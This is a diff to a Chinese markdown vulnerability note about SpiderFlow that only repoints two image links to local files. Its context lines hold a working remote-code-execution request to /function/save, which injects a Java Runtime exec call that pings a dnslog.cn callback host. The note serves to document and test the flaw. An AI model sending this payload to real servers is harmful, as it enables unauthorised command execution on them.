@@ -22,7 +22,7 @@ title=="SpiderFlow"
 
 主页面
 
-![image-20220524153437590](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241534681.png)
+![image-20220524153437590](./images/202205241534681.png)
 
 发送请求包执行命令
 
@@ -32,4 +32,4 @@ POST /function/save
 id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('ping chwd71.dnslog.cn');{
 ```
 
-![image-20220524153448336](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205241534389.png)
+![image-20220524153448336](./images/202205241534389.png)
